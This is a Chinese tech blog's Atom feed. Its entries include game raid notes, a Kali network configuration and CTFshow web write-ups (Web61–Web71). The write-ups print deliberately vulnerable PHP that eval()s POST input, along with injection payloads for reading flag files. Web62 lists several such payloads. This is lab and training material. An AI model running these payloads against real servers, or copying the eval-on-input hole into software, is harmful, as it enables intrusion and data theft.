@@ -1,0 +1,482 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>Auran_Lu的技术博客</title>
+  
+  <subtitle>技术分享与学习笔记</subtitle>
+  <link href="https://auranlu.cc/atom.xml" rel="self"/>
+  
+  <link href="https://auranlu.cc/"/>
+  <updated>2025-03-24T00:52:50.549Z</updated>
+  <id>https://auranlu.cc/</id>
+  
+  <author>
+    <name>Auran_Lu</name>
+    
+  </author>
+  
+  <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="https://auranlu.cc/Auran_Lu/%E9%AD%94%E5%85%BD%E4%B8%96%E7%95%8C/11.1%E5%A4%A7%E7%B1%B3/%E8%A3%85%E7%AD%89%E5%9B%BE/"/>
+    <id>https://auranlu.cc/Auran_Lu/%E9%AD%94%E5%85%BD%E4%B8%96%E7%95%8C/11.1%E5%A4%A7%E7%B1%B3/%E8%A3%85%E7%AD%89%E5%9B%BE/</id>
+    <published>2025-03-24T00:52:50.549Z</published>
+    <updated>2025-03-24T00:52:50.549Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/7Q2v-2iwgZ1hT3cS178-148.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;figure&gt;
+&lt;img
+src=&quot;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/7Q2v-2iwgZ1hT3cS178-148.png&quot;
+alt=&quot;img&quot; /&gt;
+&lt;figcaption aria-hidde</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="https://auranlu.cc/Auran_Lu/%E9%AD%94%E5%85%BD%E4%B8%96%E7%95%8C/11.1%E5%A4%A7%E7%B1%B3/%E9%BA%A6%E5%8D%A1%E8%B4%A1%E8%BD%A6%E9%97%B4/"/>
+    <id>https://auranlu.cc/Auran_Lu/%E9%AD%94%E5%85%BD%E4%B8%96%E7%95%8C/11.1%E5%A4%A7%E7%B1%B3/%E9%BA%A6%E5%8D%A1%E8%B4%A1%E8%BD%A6%E9%97%B4/</id>
+    <published>2025-03-24T00:52:50.549Z</published>
+    <updated>2025-03-24T00:52:50.549Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一号前及一号">一号前及一号</h2><h3 id="小怪地板电锯">小怪（地板电锯）</h3><p>炸弹坦克：主目标，读条引爆需要断</p><h3 id="boss">BOSS</h3><p>双子压血</p><p>坦克： 索敌击飞，点名冲锋，被点远离人群确保身后无地雷</p><p>人形：AOE</p><h2 id="二号前及二号">二号前及二号</h2><h3 id="小怪">小怪</h3><p>废料处理单位：超级电钻AOE，开减伤</p><p>金属粘泥：腐蚀泥浆控断</p><p>垃圾场训犬：上dot要开减伤</p><h3 id="boss-1">BOSS</h3><p>空投：躲地板</p><p>喷射烈焰：躲箱子后</p><p>冲锋：圈分散且不能炸箱子</p><h2 id="三号前及三号">三号前及三号</h2><h3 id="小怪-1">小怪</h3><p>爆破金刚：270度AOE，躲范围</p><p>麦卡贡机械师：打断调教</p><h3 id="boss-2">BOSS</h3><p>转火盆栽</p><p>躲齿轮</p><p>躲地板</p><p>烈焰火炮：转圈跑</p><h2 id="四号前及四号">四号前及四号</h2><h3 id="小怪-2">小怪</h3><p>蜘蛛坦克：全团AOE减伤</p><p>防御坦克：全团AOE减伤</p><p>麦卡贡工匠：召唤小怪自爆</p><h3 id="boss-3">BOSS</h3><p>一阶段：躲避球</p><p>二阶段:点名被追一直跑，其他人躲</p><p>三阶段：出磁铁开减伤远离</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;一号前及一号&quot;&gt;一号前及一号&lt;/h2&gt;
+&lt;h3 id=&quot;小怪地板电锯&quot;&gt;小怪（地板电锯）&lt;/h3&gt;
+&lt;p&gt;炸弹坦克：主目标，读条引爆需要断&lt;/p&gt;
+&lt;h3 id=&quot;boss&quot;&gt;BOSS&lt;/h3&gt;
+&lt;p&gt;双子压血&lt;/p&gt;
+&lt;p&gt;坦克： 索敌击飞，点名冲锋，被点远离人</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="https://auranlu.cc/Auran_Lu/python/python%E5%85%A5%E9%97%A8/Untitled/"/>
+    <id>https://auranlu.cc/Auran_Lu/python/python%E5%85%A5%E9%97%A8/Untitled/</id>
+    <published>2025-03-24T00:52:50.544Z</published>
+    <updated>2025-03-24T00:52:50.544Z</updated>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+      
+      
+    <summary type="html">
+</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="https://auranlu.cc/Auran_Lu/HackTheBox/Untitled/"/>
+    <id>https://auranlu.cc/Auran_Lu/HackTheBox/Untitled/</id>
+    <published>2025-03-24T00:52:50.543Z</published>
+    <updated>2025-03-24T00:52:50.543Z</updated>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+      
+      
+    <summary type="html">
+</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Web71</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web71/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web71/</id>
+    <published>2025-03-23T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250324082347661.png"alt="image-20250324082347661" /><figcaption aria-hidden="true">image-20250324082347661</figcaption></figure><blockquote><p>[!IMPORTANT]</p></blockquote><h2 id="x01">0x01</h2><p>访问靶场，获得回显，下载源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门__Web71_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Web66</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web66/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web66/</id>
+    <published>2025-03-21T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322150905074.png"alt="image-20250322150905074" /><figcaption aria-hidden="true">image-20250322150905074</figcaption></figure><blockquote><p>[!IMPORTANT]</p></blockquote><h2 id="x01">0x01</h2><p>访问靶场，回显源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x02">0x02</h2><p>post传参<code>c=print_r(scandir('./'));</code>查看当前目录</p><figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322151752244.png"alt="image-20250322151752244" /><figcaption aria-hidden="true">image-20250322151752244</figcaption></figure><p><strong>base64_php伪协议</strong>查看flag.php</p><figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322152209416.png"alt="image-20250322152209416" /><figcaption aria-hidden="true">image-20250322152209416</figcaption></figure><p>解码后发现被晃飞了</p><figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322152235585.png"alt="image-20250322152235585" /><figcaption aria-hidden="true">image-20250322152235585</figcaption></figure><p>目录扫描扫扫其他地方试试，发现flag.txt</p><figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322152415364.png"alt="image-20250322152415364" /><figcaption aria-hidden="true">image-20250322152415364</figcaption></figure><p>伪协议编码查看flag.txt</p><figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322155025669.png"alt="image-20250322155025669" /><figcaption aria-hidden="true">image-20250322155025669</figcaption></figure><p>解码后获得flag</p>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门__Web66_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Web67</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web67/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web67/</id>
+    <published>2025-03-21T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322155128448.png"alt="image-20250322155128448" /><figcaption aria-hidden="true">image-20250322155128448</figcaption></figure><blockquote><p>[!IMPORTANT]</p></blockquote><p>与Web66类似，<code>print_r()</code>被禁用，替换为<code>var_dump</code>，其余不再赘述</p>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门__Web67_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Web68</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web68/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web68/</id>
+    <published>2025-03-21T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322160814766.png"alt="image-20250322160814766" /><figcaption aria-hidden="true">image-20250322160814766</figcaption></figure><blockquote><p>[!IMPORTANT]</p></blockquote><p>与67雷同，不再赘述</p>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门__Web68_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Web69</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web69/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web69/</id>
+    <published>2025-03-21T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322162217477.png"alt="image-20250322162217477" /><figcaption aria-hidden="true">image-20250322162217477</figcaption></figure><blockquote><p>[!IMPORTANT]</p></blockquote><p>与67雷同，不再赘述</p>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门__Web69_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Web70</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web70/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web70/</id>
+    <published>2025-03-21T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250322162608281.png"alt="image-20250322162608281" /><figcaption aria-hidden="true">image-20250322162608281</figcaption></figure><p>与67雷同，不再赘述</p>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门__Web70_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>kali_linux桥接配置</title>
+    <link href="https://auranlu.cc/Auran_Lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/kali_linux%E6%A1%A5%E6%8E%A5%E9%85%8D%E7%BD%AE/"/>
+    <id>https://auranlu.cc/Auran_Lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/kali_linux%E6%A1%A5%E6%8E%A5%E9%85%8D%E7%BD%AE/</id>
+    <published>2025-03-16T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.548Z</updated>
+    
+    <content type="html"><![CDATA[<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#静态</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.165.246</span><br><span class="line">netmask 255.255.0.0</span><br><span class="line">gateway 192.168.165.251</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/resolv.conf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nameserver 192.168.165.251</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/networking start</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">连接特定的 DNS 后缀: </span><br><span class="line">描述: Remote NDIS Compatible Device</span><br><span class="line">物理地址: ‎CE-84-4E-16-E6-7C</span><br><span class="line">已启用 DHCP: 是</span><br><span class="line">IPv4 地址: 192.168.165.245</span><br><span class="line">IPv4 子网掩码: 255.255.255.0</span><br><span class="line">获得租约的时间: 2025年3月17日 16:32:42</span><br><span class="line">租约过期的时间: 2025年3月17日 17:34:07</span><br><span class="line">IPv4 默认网关: 192.168.165.251</span><br><span class="line">IPv4 DHCP 服务器: 192.168.165.251</span><br><span class="line">IPv4 DNS 服务器: 192.168.165.251</span><br><span class="line">IPv4 WINS 服务器: </span><br><span class="line">已启用 NetBIOS over Tcpip: 是</span><br><span class="line">IPv6 地址: 2409:8929:6f46:95:b5a7:9dec:270d:24ff</span><br><span class="line">临时 IPv6 地址: 2409:8929:6f46:95:ceb:9b0c:537e:b782</span><br><span class="line">连接-本地 IPv6 地址: fe80::aa69:84e1:6c67:521b%18</span><br><span class="line">IPv6 默认网关: fe80::c33:7eff:fea7:1d43%18</span><br><span class="line">IPv6 DNS 服务器: </span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">kali_linux桥接相关命令配置</summary>
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Web61</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web61/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web61/</id>
+    <published>2025-03-14T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250315151425867.png"alt="image-20250315151425867" /><figcaption aria-hidden="true">image-20250315151425867</figcaption></figure><blockquote><p>[!IMPORTANT]</p></blockquote><h2 id="x01">0x01</h2><p>访问靶场，回显源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x02">0x02</h2><p>与Web58雷同，不再赘述</p>]]></content>
+    
+    
+    <summary type="html">CTFshow_Web入门_Web61_WP</summary>
+    
+    
+    
+    <category term="CTFshow" scheme="https://auranlu.cc/categories/CTFshow/"/>
+    
+    <category term="web入门" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/"/>
+    
+    <category term="命令执行" scheme="https://auranlu.cc/categories/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Web62</title>
+    <link href="https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web62/"/>
+    <id>https://auranlu.cc/Auran_Lu/CTFshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Web62/</id>
+    <published>2025-03-14T16:00:00.000Z</published>
+    <updated>2025-03-24T00:52:50.524Z</updated>
+    
+    <content type="html"><![CDATA[<figure><imgsrc="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250315152839289.png"alt="image-20250315152839289" /><figcaption aria-hidden="true">image-20250315152839289</figcaption></figure><blockquote><p>[!IMPORTANT]</p></blockquote><h2 id="x01">0x01</h2><p>访问靶场，回显源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Lazzaro</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x02">0x02</h2><p>雷同58，此处补充一些常见读取文件命令及payload替代</p><ul><li><p><code>file()</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//payload示例</span></span><br><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">c=<span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">c=</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$b</span>=<span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//file()函数：把整个文件读入一个数组中</span></span><br><span class="line">c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">c=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file</span>(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line"></span><br><span class="line">c=<span class="title function_ invoke__">readfile</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//一行一行读取</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line"><span class="comment">//一个一个字符读取</span></span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);<span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$a</span>)) &#123;<span class="variable">$line</span> = <span class="title function_ invoke__">fgetc</span>(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$line</span>;&#125;</span><br><span class="line">c=<span class="variable">$a</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span 